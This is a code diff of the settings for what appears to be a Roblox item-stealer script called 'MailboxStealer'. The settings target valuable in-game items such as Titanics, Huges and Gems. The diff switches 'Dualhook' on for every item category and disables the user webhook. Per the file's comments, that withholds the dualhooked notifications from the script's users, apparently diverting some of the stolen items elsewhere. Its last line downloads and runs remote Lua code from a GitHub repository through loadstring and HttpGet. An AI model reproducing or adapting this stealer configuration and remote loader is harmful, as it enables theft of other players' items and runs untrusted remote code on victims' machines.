@@ -1,43 +1,44 @@
 getgenv().Settings = {
-    PremiumKey = "MonzBetter-Bruh", --// Base 64 encoded username here
-    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    PremiumKey = "MonzBetter-Bruh",
+    Webhook = false, -- By Making This True The Users Of Your Script Will Be Able
+    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
     MailMessage = "Monzz Better",
-      Titanics = {
-        Dualhook = false,
-        Intensity = 100--%
-      },
-      Banana = {
-        Dualhook = false,
-        Intensity = 100--%
-      },
-      Huges = {
-        Dualhook = false,
-        Intensity = 100--%
-      },
-      Pogs = {
-        Dualhook = false,
-        Intensity = 100--%
-      },
-       Exclusives = {
-        Dualhook = false,
-        Intensity = 100--%
-      },
-       Events = {
-        Dualhook = false,
-        Intensity = 100--%
-      },
-       Secrets = {
-        Dualhook = false,
-        Intensity = 100--%
-       },
-       HC_DM_Mythics = {
-        Dualhook = false,
-        Intensity = 100--%
-       },
-       Gems = {
-        Dualhook = false,
-        Intensity = 100--%
-      }
-    }
+  Titanics = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Banana = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Huges = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Pogs = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Exclusives = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Events = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Secrets = {
+       Dualhook = true,
+       Intensity = 100--%
+   },
+   HC_DM_Mythics = {
+       Dualhook = true,
+       Intensity = 100--%
+   },
+   Gems = {
+       Dualhook = true,
+       Intensity = 100--%
+  }
+}
     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Api", true))()
